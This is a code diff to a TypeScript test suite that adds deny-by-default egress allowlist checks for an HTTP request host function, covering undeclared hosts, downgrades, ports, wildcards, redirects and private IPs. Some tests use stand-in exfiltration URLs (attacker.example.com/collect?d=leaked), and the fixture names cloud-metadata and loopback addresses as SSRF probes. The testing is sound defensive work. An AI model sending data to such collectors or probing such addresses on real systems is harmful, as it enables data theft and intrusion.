@@ -90,6 +90,20 @@ const baseCtx: GzacApiCallContext = {
   serviceToken: "service-token-abc",
   gzacBaseUrl: "https://gzac.example.com",
   grantedCapabilities: ["http_request"],
+  // http_request is deny-by-default, so every destination a spec expects to reach has to be declared
+  // here — the same list GZAC pushes, unioned from the manifest and the x-egress-target properties.
+  allowedEgress: [
+    "api.example.com",
+    "http://api.example.com",
+    "other.example.com",
+    "elsewhere.example.com",
+    "internal.example.com",
+    "https://gzac.example.com:9443",
+    "https://127.0.0.1",
+    "https://169.254.169.254",
+    "https://[::1]",
+    "https://[::ffff:127.0.0.1]",
+  ],
 };
 
 interface InvokeOptions {
@@ -292,6 +306,15 @@ describe("http_request host function", () => {
       expect(fetchMock).toHaveBeenCalledTimes(1);
     });
 
+    it("keeps rejecting a private IP literal that is declared as an egress target", async () => {
+      // The address envelope is not overridable by a declaration: naming a loopback origin in a
+      // manifest or a config property does not make it reachable — only the operator's carve-out does.
+      const reply = await invoke({method: "GET", url: "https://127.0.0.1/admin"});
+      expect(reply.status).toBe(400);
+      expect(reply.body.error).toContain("private or reserved range");
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
+
     it("builds a DNS-guarded dispatcher by default and a plain one when private networks are allowed", async () => {
       createHttpRequestHostFunction(noopLogger(), logRepoDouble().repo, false, false);
       expect(agentCtor).toHaveBeenCalledTimes(1);
@@ -301,6 +324,101 @@ describe("http_request host function", () => {
       createHttpRequestHostFunction(noopLogger(), logRepoDouble().repo, false, true);
       expect(agentCtor).toHaveBeenCalledTimes(1);
       expect(agentCtor.mock.calls[0][0]).toBeUndefined();
+    });
+  });
+
+  describe("egress allowlist — deny by default", () => {
+    it("refuses a destination the configuration never declared, before any fetch", async () => {
+      const reply = await invoke({method: "GET", url: "https://attacker.example.com/collect"});
+      expect(reply.status).toBe(400);
+      expect(reply.body.error).toContain("not in this configuration's egress allowlist");
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
+
+    it("refuses everything when the configuration carries no egress targets at all", async () => {
+      const reply = await invoke(
+        {method: "GET", url: "https://api.example.com/x"},
+        {ctx: {...baseCtx, allowedEgress: []}}
+      );
+      expect(reply.status).toBe(400);
+      expect(reply.body.error).toContain("has no egress targets");
+      expect(reply.body.error).toContain("permissions.egress");
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
+
+    it("refuses everything when the push carried no allowlist (older GZAC — no implicit grant)", async () => {
+      const reply = await invoke(
+        {method: "GET", url: "https://api.example.com/x"},
+        {ctx: {...baseCtx, allowedEgress: undefined}}
+      );
+      expect(reply.status).toBe(400);
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
+
+    it("allows a declared origin", async () => {
+      const reply = await invoke(
+        {method: "GET", url: "https://svc.vendor.com/v1/things"},
+        {ctx: {...baseCtx, allowedEgress: ["svc.vendor.com"]}}
+      );
+      expect(reply.status).toBe(200);
+      expect(fetchMock).toHaveBeenCalledTimes(1);
+    });
+
+    it("does not let a scheme-less declaration authorise an http downgrade", async () => {
+      // `svc.vendor.com` means https on 443. Hostname-only matching would let this through the moment
+      // an operator sets HOST_ALLOW_HTTP=true.
+      const reply = await invoke(
+        {method: "GET", url: "http://svc.vendor.com/v1"},
+        {ctx: {...baseCtx, allowedEgress: ["svc.vendor.com"]}, allowHttp: true}
+      );
+      expect(reply.status).toBe(400);
+      expect(reply.body.error).toContain("not in this configuration's egress allowlist");
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
+
+    it("treats a portless declaration as the default port only", async () => {
+      const reply = await invoke(
+        {method: "GET", url: "https://svc.vendor.com:9200/_search"},
+        {ctx: {...baseCtx, allowedEgress: ["svc.vendor.com"]}}
+      );
+      expect(reply.status).toBe(400);
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
+
+    it("honours an explicit non-default port", async () => {
+      const reply = await invoke(
+        {method: "GET", url: "https://sd.acme-acc.internal:8443/api/doc"},
+        {ctx: {...baseCtx, allowedEgress: ["https://sd.acme-acc.internal:8443"]}}
+      );
+      expect(reply.status).toBe(200);
+    });
+
+    it("accepts one subdomain under a wildcard, but not the apex or a deeper name", async () => {
+      const ctx = {...baseCtx, allowedEgress: ["*.vendor.com"]};
+      expect((await invoke({method: "GET", url: "https://api.vendor.com/x"}, {ctx})).status).toBe(200);
+      expect((await invoke({method: "GET", url: "https://vendor.com/x"}, {ctx})).status).toBe(400);
+      expect((await invoke({method: "GET", url: "https://a.b.vendor.com/x"}, {ctx})).status).toBe(400);
+    });
+
+    it("re-checks the allowlist on every redirect hop", async () => {
+      // The laundering case: an allowlisted host 302s onward to an undeclared one.
+      fetchMock.mockResolvedValueOnce(
+        redirectResponse(302, "https://attacker.example.com/collect?d=leaked")
+      );
+      const reply = await invoke({method: "GET", url: "https://api.example.com/x"});
+      expect(reply.status).toBe(400);
+      expect(reply.body.error).toContain("blocked:");
+      expect(reply.body.error).toContain("egress allowlist");
+      expect(fetchMock).toHaveBeenCalledTimes(1);
+    });
+
+    it("still applies when the private-network escape hatch is on — it is a separate layer", async () => {
+      const reply = await invoke(
+        {method: "GET", url: "https://attacker.example.com/collect"},
+        {allowPrivateNetwork: true}
+      );
+      expect(reply.status).toBe(400);
+      expect(fetchMock).not.toHaveBeenCalled();
     });
   });
 
